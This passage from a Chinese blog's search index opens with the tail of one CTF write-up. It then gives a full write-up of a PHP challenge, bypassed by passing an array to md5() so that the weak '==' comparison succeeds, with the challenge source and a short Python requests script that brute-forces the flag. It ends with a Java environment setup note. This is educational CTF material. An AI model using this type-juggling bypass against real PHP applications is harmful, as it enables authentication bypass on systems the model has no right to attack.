<p>php的chr()官方文档:<a href="https://www.php.net/manual/en/function.chr.php" target="_blank" rel="noopener">https://www.php.net/manual/en/function.chr.php</a><br>python的chr()官方文档:<a href="https://docs.python.org/zh-cn/3.7/library/functions.html#chr" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3.7/library/functions.html#chr</a></p>
<hr>
<p>思考问题：<br>值得注意的是：每次访问fl3g_ichuqiu.php文件,php脚本只会取cookies[“user”]的值传入解密函数，每次破解时，$key不变，$rnd在改变，<br>然而$rnd其实是在密文里面，所以只需要$key就行了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>MISC</tag>
        <tag>base64</tag>
        <tag>WEB渗透</tag>
        <tag>加密解密算法</tag>
      </tags>
  </entry>
  <entry>
    <title>“百度杯”CTF比赛2017二月场爆破-3</title>
    <url>/2019/11/05/%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9DCTF%E6%AF%94%E8%B5%9B2017%E4%BA%8C%E6%9C%88%E5%9C%BA%E7%88%86%E7%A0%B4-3/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-34c26c6fd9d121a0.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能图床挂了" title="烟云">
一道简单的题，主要是php中md5()函数，以及弱比较“==”可以绕过
<a id="more"></a>

<hr>
<h3 id="00x0-分析代码"><a href="#00x0-分析代码" class="headerlink" title="00x0 分析代码"></a>00x0 分析代码</h3><p>题目点开就是代码，直接分析，因为md5()加密一个array返回null，null==0，所以绕过了。url构造一个?value[]=ea就可以，?value[]=ea<br>这里会把=后面的字符当成一个字符串传入value[0]，所以$value[0].$value[1] = ea，<br>所以写脚本破解就好了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(&apos;./flag.php&apos;);</span><br><span class="line">if(!isset($_SESSION[&apos;nums&apos;]))&#123;</span><br><span class="line">  $_SESSION[&apos;nums&apos;] = 0;</span><br><span class="line">  $_SESSION[&apos;time&apos;] = time();</span><br><span class="line">  $_SESSION[&apos;whoami&apos;] = &apos;ea&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;time&apos;]+120&lt;time())&#123;</span><br><span class="line">  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = $_REQUEST[&apos;value&apos;];</span><br><span class="line">$str_rand = range(&apos;a&apos;, &apos;z&apos;);</span><br><span class="line">$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;whoami&apos;]==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;</span><br><span class="line">  $_SESSION[&apos;nums&apos;]++;</span><br><span class="line">  $_SESSION[&apos;whoami&apos;] = $str_rands;</span><br><span class="line">  echo $str_rands;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_SESSION[&apos;nums&apos;]&gt;=10)&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># python3</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://e1fce1189b43430098eb036a8b0cba99756d027b1910435d.changame.ichunqiu.com/&apos;</span><br><span class="line">session = requests.Session()</span><br><span class="line">html = session.get(url + &apos;?value[]=ea&apos;).text</span><br><span class="line">for i in range(10):</span><br><span class="line">    html = session.get(url + &apos;?value[]=&apos; + html[0:2]).text</span><br><span class="line">    if &apos;flag&#123;&apos; in html:</span><br><span class="line">        break</span><br><span class="line">print(html[2:])</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf题解</tag>
        <tag>web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>java环境配置</title>
    <url>/2019/11/02/java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<img src="https://upload-images.jianshu.io/upload_images/13192223-e03f44f8da420569.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="可能照片不在了" title="流浪的骑士">
因为偶尔会遇到系统崩溃，所以记录一下java环境的配置
<a id="more"></a>

<hr>
<h2 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h2><h4 id="JAVA-HOME"><a href="#JAVA-HOME" class="headerlink" title="JAVA_HOME"></a>JAVA_HOME</h4><p><a href="https://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html" target="_blank" rel="noopener">jdk8官网下载</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Java\jdk-9.0.1</span><br></pre></td></tr></table></figure>

<h4 id="CLASSPATH"><a href="#CLASSPATH" class="headerlink" title="CLASSPATH"></a>CLASSPATH</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Java\jre-9.0.1\lib</span><br></pre></td></tr></table></figure>

<h4 id="Path"><a href="#Path" class="headerlink" title="Path"></a>Path</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Program Files\Java\jdk-9.0.1\bin</span><br></pre></td></tr></table></figure>
<p>配置好环境后输入以下命令检验</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java --vsersion</span><br><span class="line">java</span><br><span class="line">javac</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Ubuntu16-0"><a href="#Ubuntu16-0" class="headerlink" title="Ubuntu16.0"></a>Ubuntu16.0</h2><p>推介安装openjdk </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 更新</span><br><span class="line">sudo apt-get update</span><br><span class="line"># 安装</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br><span class="line"># 检查</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安装配置</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
